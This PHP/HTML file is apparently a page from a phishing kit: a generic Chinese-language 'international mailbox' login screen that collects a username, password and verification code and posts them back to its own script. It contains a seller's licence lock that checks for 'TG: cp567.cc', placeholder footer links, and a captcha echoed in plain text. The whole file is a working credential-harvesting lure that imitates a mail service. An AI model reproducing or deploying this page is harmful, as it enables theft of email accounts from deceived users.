<?php
//echo "1";
if (!defined('ROOT_PATH'))
exit('server time out');
if (!defined('Copyright') || Copyright != 'TG: cp567.cc')
exit('TG: cp567.cc');

?>
<html>
<head>
<title>welcome</title>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">
  <style type="text/css">
    body{font-family: "新細明體";}
	.td1{width:1005px;height:119px;background:url(255_files/255_01.jpg) no-repeat;}
	.td2{width:612px;height:481px;font-size: 12px;background:url(255_files/255_02.jpg) no-repeat;color:#999999}	
	div.info{position:relative;top:100px;left:90px;font-size: 12px;z-index:3;}
	div.info ul li{margin:17px 0 0 0;padding:0;}	
	div.info ul li span{font-weight:bold;color:#333333}
	div.copyright{position:relative;top:142px;left:320px;z-index:3;}
	div.copyright ul li{margin:12px 0 0 0;padding:0;list-style-type:none;color:#333333;}
	div.copyright ul li span{margin:0 15px 0 0;}
	div.copyright ul li.reserved{padding:0 0 0 90px}
	div.copyright ul li span a{text-decoration:none;color:#333333}
	div.copyright ul li span a:hover{text-decoration:underline;color:#848484}	
	ul.content{position:relative;top:20px;color:#626262}
	ul.content li{margin:15px 0 0 0;font-size:14px;}
	.shadow{background-image:url(255_files/shadow.gif);background-position:center;background-repeat: no-repeat;height:610px;}
	.style1 { font-size: 16px;font-weight:bold;color: #000000;margin-right:10px;}
    .style2 { font-size: 16px;font-weight:bold;color: #000000;margin-left:10px;}
    .style6 {text-align:right;font-size: 14px;color: #888888; font-weight: 800;}
    .btnTd p{height:40px;margin:0 105px 0 0px;padding:5px 0 0 0}
	.inputBlock{margin:0 0 0 8px;padding:0px;height:18px;width:165px;border:0px solid #1882d0;line-height:18px;color:#000000;}
	  .code {font-family:Georgia, "Times New Roman", Times, serif;color:#3333FF;font-size: 18px;}
	 
    </style> 


</head>
<body bgcolor="#f9f9f9" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<form name="form_login" method="post" action="">
<table cellpadding="0" cellspacing="0" border="0" align="center" width="100%" height="100%"> 
  <tr> 
    <td valign="middle" align="center">      
      <div  class="shadow" align="center" >
<table id="Table_01" width="1005" height="600" border="0" cellpadding="0" cellspacing="0">
	<tr>
		<td colspan="2" class="td1">
		</td>
	</tr>
	<tr>
		<td class="td2">
		  <div class="info">
		    <ul>
			  <li><span>安全殺毒</span><br>免費防堵垃圾信，并可針对每个信件附檔进行病毒掃瞄</li>
			  <li><span>穩定快速</span><br>类似 outlook 瀏览方式，讓您方便瀏览信件 </li>
			  <li><span>商務便利</span><br>增加行事曆、记事本等功能，方便您日常的使用 </li>
			</ul>
		  </div>		 
		  <div class="copyright">
		    <ul>
			  <li>
			    <span><a href="#">关于國際</a></span>
				<span><a href="#">廣告合作</a></span>
				<span><a href="#">客户服務</a></span>
				<span><a href="#">隱私政策</a></span>
				<span><a href="#">相关法律</a></span>
				<span><a href="#">连系我們</a></span>
			  </li>
			  <li class="reserved">國際郵箱 All rights reserved. 版权聲明</li>			  	
			</ul>
		  </div>
		</td>
		<td width="393" height="481">
		
		   <table width="100%" height="481" cellspacing="0" cellpadding="0" border="0" background="255_files/255_03.jpg" >
		      <tr>		        
				<td width="393" align="left" valign="top">
				    <table width="300" height="113" cellspacing="0" cellpadding="0" border="0" >
					   <tr>
				         <td height="26" colspan="3"></td>
					   </tr>					   
					   <tr>
				          <td width="15"></td>
                          <td width="50" height="30" class="style6" >帐 号 :</td>
				          <td width="255">
						   <div align="left">
					         <input name="user" type="text" class="inputBlock" tabindex="1">	
			               </div>
						  </td>				      
					   </tr>
                       <tr>
				         <td height="16" class="style6" align="center"></td> 
					     <td></td>
						 <td></td>
					   </tr> 
					   <tr>
				         <td></td>
                         <td height="30" class="style6" align="left">密 码 :</td> 
					       <td>
						     <div align="left">
					           <input name="pass" type="password" class="inputBlock" tabindex="2">
				             </div></td>					      
					   </tr> 
					   <tr>
				         <td></td>
                         <td height="30" class="style6" align="left">验 证 :</td> 
					       <td>
						     <div align="left">
					           <input name="code" type="text" class="inputBlock" style="width:80px;border: 1px solid;" tabindex="3">
					              <b class="code"><?php echo $_SESSION['code'];?></b>
				             </div></td>					      
					   </tr> 
                       <tr>
                         <td></td><td height="6"></td><td></td>
                       </tr>
                       <tr>                         						 
						 <td colspan="3" align="center" valign="bottom" class="btnTd">
                            <p><input name="loginBtn" type="image" value="提交" src="255_files/button.gif" tabindex="3"></p>
						 </td>
                       </tr>				     
			         </table>
					 <ul class="content">
			            <li>享受私人專属空间</li>
			            <li>品質始终如一 </li>
			            <li>國際郵箱提醒:謹防网路詐騙</li>
			          </ul>
			       </td>
			     </tr>		     
		      </table> 
		
		</td>
	</tr>
</table>
</div>    
    </td>
  </tr>
</table>
</form>
</body>
</html>
